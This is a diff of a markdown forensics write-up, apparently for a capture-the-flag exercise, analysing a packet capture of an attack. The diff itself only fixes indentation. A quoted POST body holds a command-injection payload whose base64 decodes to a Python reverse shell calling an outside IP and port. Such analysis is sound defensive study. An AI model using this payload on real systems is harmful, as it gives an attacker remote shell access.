@@ -37,7 +37,7 @@ While looking at the `POST` requests for number 2, I noticed that a couple packe
 username=;`echo+"cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTU5LjIyMy4zMy4yNDAiLDk5OTkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc="+|+base64+-d+|+sh`
 ```
 
-    The use of `;` was clearly to escape some sort of templating mechanism, so whatever is after that is probably an RCE. I took the base64 encoded string and decoded it:
+The use of `;` was clearly to escape some sort of templating mechanism, so whatever is after that is probably an RCE. I took the base64 encoded string and decoded it:
 
 ![RCE Base64 decoded](./assets/image-2.png)
 
@@ -57,19 +57,19 @@ A **LOT** of packets, so to narrow it down, basing off number 3, we filter for T
 ![A lot to just 87 packets](./assets/image-4.png)
 Now it's really just a matter of us scrolling down frame by frame to analyze what the post-exploit shell did.
 
-    1. At 2624-2625 the shell executes an `ls` command
+1. At 2624-2625 the shell executes an `ls` command
 
 ![ls command](./assets/image-5.png)
 
-    2. At 2648 we see that the `ls` returned a `/`-esque output
+2. At 2648 we see that the `ls` returned a `/`-esque output
 
 ![Looks like an "ls /" output](./assets/image-6.png)
 
-    3. Then, at 2742-2743, it does a `cd` to `/tmp`
+3. Then, at 2742-2743, it does a `cd` to `/tmp`
 
 ![cd to `/tmp`](./assets/image-7.png)
 
-    4. Finally, at 2767-2768, the shell pipes a shell script to a file titled `.hmm.sh`
+4. Finally, at 2767-2768, the shell pipes a shell script to a file titled `.hmm.sh`
 
 ![hmm.sh](./assets/image-8.png)
 
